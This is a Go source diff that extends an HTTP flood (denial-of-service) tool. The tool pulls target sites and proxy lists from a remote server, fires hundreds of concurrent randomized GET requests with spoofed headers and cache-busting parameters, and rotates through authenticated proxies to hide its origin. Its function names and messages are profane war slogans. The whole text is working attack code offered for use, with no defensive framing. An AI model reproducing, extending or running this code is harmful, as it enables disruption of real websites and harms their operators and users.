@@ -11,6 +11,7 @@ import (
 	"os"
 	"strconv"
 	"strings"
+	"sync"
 	"sync/atomic"
 	"time"
 
@@ -41,12 +42,19 @@ func (si *strikeItem) PagePayload() string {
 	return fmt.Sprintf("%s%s%s=%s", si.Page, paramJoiner, buildblock(rand.Intn(7)+3), buildblock(rand.Intn(7)+3))
 }
 
-type statistics map[string]*statItem
-
 type statItem struct {
 	failCnt   int32
 	succCnt   int32
 	startTime time.Time
+}
+
+type statistics map[string]*statItem
+
+type proxyItem struct {
+	Id     int32
+	Ip     string
+	Auth   string
+	Scheme string
 }
 
 const (
@@ -55,11 +63,14 @@ const (
 )
 
 var (
-	strikeList                 []strikeItem
-	statData                   statistics
-	limiter, refresher         chan struct{}
-	noProxyClient, proxyClient *http.Client
-	ipEcho                     ipInfo
+	strikeList         []strikeItem
+	statData           statistics
+	limiter, refresher chan struct{}
+	noProxyClient      *http.Client
+	ipEcho             *ipInfo
+	proxyList          []proxyItem
+	proxyClients       sync.Map
+	currProxyListId    int32
 
 	headersReferers []string = []string{
 		"http://www.google.com/?q=",
@@ -72,16 +83,17 @@ var (
 
 func main() {
 	var (
-		threads int
-		siteUrl string
-		sites   []string
-		refresh time.Duration
+		threads           int
+		siteUrl, proxyUrl string
+		sites             []string
+		refresh           time.Duration
 	)
 
 	flag.IntVarP(&threads, "max-routines", "t", 500, "Maximum number of simultaneous connections")
 	flag.StringArrayVarP(&sites, "site", "s", []string{}, "Sites list. Can be used multiple times. Have precedence over sites-url if set `site-url`")
 	flag.StringVarP(&siteUrl, "sites-url", "u", "https://hutin-puy.nadom.app/sites.json", "URL to fetch sites list from `sites-url`")
 	flag.DurationVarP(&refresh, "refresh", "r", 3*time.Second, "Screen refresh interval in seconds")
+	flag.StringVarP(&proxyUrl, "proxies-url", "p", "https://hutin-puy.nadom.app/proxy.json", "URL to fetch proxy list from `proxies-url`")
 	flag.Parse()
 
 	initVariables()
@@ -94,7 +106,23 @@ func main() {
 				fmt.Printf("error parsing %s\n", site)
 				continue
 			}
-			si := strikeItem{Url: sUrl.Scheme + "://" + sUrl.Host, Page: sUrl.String(), Atack: true, Protocol: sUrl.Scheme, Port: sUrl.Port}
+			if sUrl.Scheme == "" {
+				switch sUrl.Port() {
+				case "80", "8080":
+					sUrl.Scheme = "http"
+				case "443", "8443":
+					sUrl.Scheme = "https"
+				case "53":
+					sUrl.Scheme = "udp"
+				case "21":
+					sUrl.Scheme = "ftp"
+				case "22", "25", "143", "465", "587", "993", "995":
+					sUrl.Scheme = "tcp"
+				default:
+					sUrl.Scheme = "http"
+				}
+			}
+			si := strikeItem{Url: sUrl.Scheme + "://" + sUrl.Host, Page: sUrl.String(), Atack: true, Protocol: sUrl.Scheme, Port: sUrl.Port()}
 			strikeList = append(strikeList, si)
 		}
 	} else {
@@ -104,19 +132,20 @@ func main() {
 
 	if len(strikeList) == 0 {
 		fmt.Println("no sites to fuck! exiting...")
-		os.Exit(1)
+		os.Exit(0)
 	}
 
-	startStatsPrinter(&statData, strikeList, refresh)
+	startProxyListRefresher(&proxyUrl)
+	startStatsPrinter(&statData, &strikeList, &refresh)
 
 	for {
-		time.Sleep(100 * time.Millisecond)
+		time.Sleep(200 * time.Millisecond)
 		refresher <- struct{}{}
 
 		go func() {
 			defer func() { <-refresher }()
 
-			// fmt.Printf(" -> strikeList: %d\n", len(strikeList))
+			pId := atomic.LoadInt32(&currProxyListId)
 			for _, strike := range strikeList {
 				limiter <- struct{}{}
 
@@ -130,14 +159,20 @@ func main() {
 					statData[strike.Url] = site
 				}
 
-				go func(huilo strikeItem) {
+				go func(huilo *strikeItem, proxy *proxyItem) {
 					defer func() { <-limiter }()
-					if err := russiaWarShipFuckYou(huilo); err != nil {
+					if err := russiaWarShipFuckYou(huilo, proxy); err != nil {
 						atomic.AddInt32(&site.failCnt, 1)
 					} else {
 						atomic.AddInt32(&site.succCnt, 1)
 					}
-				}(strike)
+				}(&strike, &proxyList[pId])
+			}
+
+			if pId+1 == int32(len(proxyList)) {
+				atomic.StoreInt32(&currProxyListId, 0)
+			} else {
+				atomic.AddInt32(&currProxyListId, 1)
 			}
 		}()
 	}
@@ -215,6 +250,59 @@ func startStrikeListRefresher(siteUrl *string) {
 	}()
 }
 
+func startProxyListRefresher(proxyUrl *string) {
+	fetchProxyList(proxyUrl)
+
+	ticker := time.NewTicker(15 * time.Minute)
+
+	go func() {
+		for {
+			select {
+			case <-ticker.C:
+				if err := fetchProxyList(proxyUrl); err != nil {
+					fmt.Println("failed to fetch proxy List. retrying...")
+					fmt.Println(err.Error())
+
+					ticker.Reset(time.Second)
+					continue
+				}
+				ticker.Reset(1 * time.Hour)
+			}
+		}
+	}()
+}
+
+func fetchProxyList(proxyUrl *string) error {
+	var (
+		body []byte
+		resp *http.Response
+		req  *http.Request
+		err  error
+	)
+
+	req, err = http.NewRequest(http.MethodGet, *proxyUrl, nil)
+	if err != nil {
+		fmt.Printf("failed to create new Request for proxy List: %v\n", err)
+	}
+
+	resp, err = noProxyClient.Do(req)
+	if err != nil {
+		fmt.Printf("failed to execute proxy List update request: %v\n", err)
+	}
+	defer resp.Body.Close()
+
+	body, err = ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return fmt.Errorf("failed to read proxy List body: %v, %d", err, resp.StatusCode)
+	}
+
+	if err = json.Unmarshal(body, &proxyList); err != nil {
+		return fmt.Errorf("failed to parse json of proxy list: %v", err)
+	}
+
+	return err
+}
+
 type ipInfo struct {
 	Ip       string
 	Hostname string
@@ -229,17 +317,17 @@ type ipInfo struct {
 }
 
 func (ii *ipInfo) String() string {
-	if len(ii.Ip) == 0 {
+	if ii == nil || len(ii.Ip) == 0 {
 		return "Unknown"
 	}
 
 	return fmt.Sprintf("%s (%s,%s,%s,%s); %s; %s; %s", ii.Ip, ii.City, ii.Region, ii.Postal, ii.Country, ii.Loc, ii.Org, ii.Timezone)
 }
 
-func startStatsPrinter(stat *statistics, strikes []strikeItem, refresh time.Duration) {
+func startStatsPrinter(stat *statistics, strikes *[]strikeItem, refresh *time.Duration) {
 	startIpInfoRefresher()
 
-	ticker := time.NewTicker(refresh)
+	ticker := time.NewTicker(*refresh)
 
 	go func() {
 		for {
@@ -249,8 +337,9 @@ func startStatsPrinter(stat *statistics, strikes []strikeItem, refresh time.Dura
 				ct := time.Now()
 				fmt.Fprintf(stats, "Current Time: %s\n", ct.Format(time.RFC1123))
 				fmt.Fprintf(stats, "Current IP: %s\n", ipEcho.String())
+				fmt.Fprintf(stats, "Current Proxy: %s\n", proxyList[atomic.LoadInt32(&currProxyListId)].Ip)
 				fmt.Fprintf(stats, "##\tURL\tSUCC\tFAIL\tDURATION\n")
-				for i, strike := range strikes {
+				for i, strike := range *strikes {
 					site, ok := (*stat)[strike.Url]
 					var (
 						succ, fail int32
@@ -299,7 +388,26 @@ func refreshIpInfo() {
 		return // err.Error()
 	}
 
-	resp, err := proxyClient.Do(req)
+	req.Header.Set("User-Agent", ua.Random()) // FIXME: it sometimes panics. see another package?
+	req.Header.Set("Cache-Control", "no-cache")
+	req.Header.Set("Pragma", "no-cache")
+	req.Header.Set("Accept-Charset", acceptCharset)
+	req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
+	req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
+	req.Header.Set("Connection", "keep-alive")
+	req.Header.Set("Host", "ipinfo.io")
+	req.Header.Set("x-forwarded-proto", "https")
+	req.Header.Set("cf-visitor", "https")
+	req.Header.Set("Accept-Language", "ru")
+	req.Header.Set("Accept", "application/json, text/plain, */*")
+
+	cl, err := proxyClient(nil)
+	if err != nil {
+		fmt.Printf("proxyClient error: %v\n", err.Error())
+		return //fmt.Errorf("proxyClient error: %v\n", err.Error())
+	}
+
+	resp, err := cl.Do(req)
 	if err != nil {
 		return // err.Error()
 	}
@@ -310,6 +418,7 @@ func refreshIpInfo() {
 		return // err.Error()
 	}
 
+	fmt.Printf("ip: %v\n", string(body))
 	if err := json.Unmarshal(body, &ipEcho); err != nil {
 		return // err.Error()
 	}
@@ -317,24 +426,35 @@ func refreshIpInfo() {
 	return // ipEcho.String()
 }
 
-func russiaWarShipFuckYou(huilo strikeItem) error {
+func russiaWarShipFuckYou(huilo *strikeItem, pr *proxyItem) error {
 	req, err := http.NewRequest(http.MethodGet, huilo.PagePayload(), nil)
 	if err != nil {
 		fmt.Printf("couldn't create new request: %v\n", err)
 		return err
 	}
 
+	host, _ := url.Parse(huilo.Url)
 	req.Header.Set("User-Agent", ua.Random()) // FIXME: it sometimes panics. see another package?
 	req.Header.Set("Cache-Control", "no-cache")
 	req.Header.Set("Accept-Charset", acceptCharset)
 	req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
 	req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
 	req.Header.Set("Connection", "keep-alive")
-	req.Header.Set("Host", huilo.Url)
+	req.Header.Set("Host", host.Hostname())
+	req.Header.Set("x-forwarded-proto", "https")
+	req.Header.Set("cf-visitor", "https")
+	req.Header.Set("Accept-Language", "ru")
+	req.Header.Set("Accept", "application/json, text/plain, */*")
 
 	// fmt.Printf("attacking %s\n", huilo.Url)
 
-	resp, err := proxyClient.Do(req)
+	cl, err := proxyClient(pr)
+	if err != nil {
+		fmt.Printf("proxyClient error: %v\n", err.Error())
+		return fmt.Errorf("proxyClient error: %v\n", err.Error())
+	}
+
+	resp, err := cl.Do(req)
 	if err != nil {
 		return fmt.Errorf("failed to fuck ship: %v\n", err)
 	}
@@ -362,16 +482,64 @@ func initVariables() {
 	tr.Proxy = nil
 	noProxyClient = &http.Client{Transport: tr}
 
-	tr2 := http.DefaultTransport.(*http.Transport).Clone()
-	tr2.IdleConnTimeout = 4 * time.Second
-	tr2.DialContext = (&net.Dialer{
-		Timeout:   2 * time.Second,
-		KeepAlive: 5 * time.Second,
-	}).DialContext
-	proxyClient = &http.Client{Transport: tr2}
-
 	refresher = make(chan struct{}, 1)
 	statData = statistics{}
 
 	ua.Random() // NOTE: init cache at this point.
+}
+
+func proxyClient(pr *proxyItem) (*http.Client, error) {
+	var proxy proxyItem
+
+	if pr != nil {
+		proxy = *pr
+	} else {
+		proxy = proxyList[atomic.LoadInt32(&currProxyListId)]
+	}
+
+	cl, ok := proxyClients.Load(proxy.Ip)
+	if ok {
+		hcl := cl.(http.Client)
+		return &hcl, nil
+	}
+
+	pu, err := url.Parse(proxy.Ip)
+	if err != nil {
+		if proxy.Scheme == "" {
+			pu, err = url.Parse("http://" + proxy.Ip)
+			if err != nil {
+				fmt.Printf("failed to parse proxy [%d]: %s\n", proxy.Id, proxy.Ip)
+				return nil, err
+			}
+		} else {
+			pu, err = url.Parse(proxy.Scheme + "://" + proxy.Ip)
+			if err != nil {
+				fmt.Printf("failed to parse proxy [%d]: %s\n", proxy.Id, proxy.Ip)
+				return nil, err
+			}
+		}
+	}
+	if pu.Scheme == "" {
+		if proxy.Scheme != "" {
+			pu.Scheme = proxy.Scheme
+		} else {
+			pu.Scheme = "http"
+		}
+	}
+	if proxy.Auth != "" {
+		auth := strings.Split(proxy.Auth, ":")
+		pu.User = url.UserPassword(auth[0], auth[1])
+	}
+
+	tr := http.DefaultTransport.(*http.Transport).Clone()
+	tr.IdleConnTimeout = 10 * time.Second
+	tr.DialContext = (&net.Dialer{
+		Timeout:   5 * time.Second,
+		KeepAlive: 15 * time.Second,
+	}).DialContext
+	tr.Proxy = http.ProxyURL(pu)
+	hcl := &http.Client{Transport: tr}
+	proxyClients.Store(proxy.Ip, *hcl)
+
+	return hcl, nil
 }
